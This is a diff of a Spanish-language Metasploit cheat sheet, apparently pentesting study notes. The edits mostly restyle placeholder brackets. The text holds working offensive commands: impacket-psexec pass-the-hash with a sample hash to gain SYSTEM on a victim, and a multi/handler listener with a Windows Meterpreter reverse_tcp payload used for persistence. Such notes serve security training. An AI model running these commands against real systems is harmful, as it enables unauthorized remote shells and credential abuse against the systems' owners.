@@ -147,14 +147,14 @@ Verificar la DB del Metasploit y después entrar (Cuando se ejecuta por primera 
 
 ❯ ctrl + z                   # Colocas la sesion en 'Background'
 ❯ sessions                   # Miramos las sesiones activas 
-❯ sessions -u <ID>           # Regresamos a la sesion 
+❯ sessions -u ❮ID❯           # Regresamos a la sesion 
 ```
 
 ## Usar Psexec
 
 ```bash 
 ❯ impacket-psexec WORKGROUP/omar@<IP Victima> -hashes :3ebi487y598ongyn98g56yng389yr6d6u  # Podemos hacer pass the hash y ser nt authority\system
-❯ impacket-psexec WORKGROUP/omar:<Password>@<IP Victima>                                  # Podemos usar la passwd para entrar y ser nt authority\system
+❯ impacket-psexec WORKGROUP/omar:<Password>@❮IP Victima❯                                  # Podemos usar la passwd para entrar y ser nt authority\system
 ```
 
 ## Persistencia 
@@ -170,12 +170,13 @@ Persistencia = Ganar acceso a la maquina victima cada cierto tiempo por si se pi
 ❯ run 
 ```
 
-Configuración del 'Listener' para las sesiones de persistencia 
+## Configuración del 'Listener' para las sesiones de persistencia 
+
 ```bash 
 ❯ use exploit/multi/handler                              # Usaremos el exploit
 ❯ show options 
 ❯ set payload windows/meterpreter/reverse_tcp            # Configuramos un payload dedicado a Windows 
-❯ set LHOST <IP Atacante>                                # Configuramos nuestra IP
+❯ set LHOST ❮IP❯                                         # Configuramos nuestra IP
 ❯ run
 ```
 
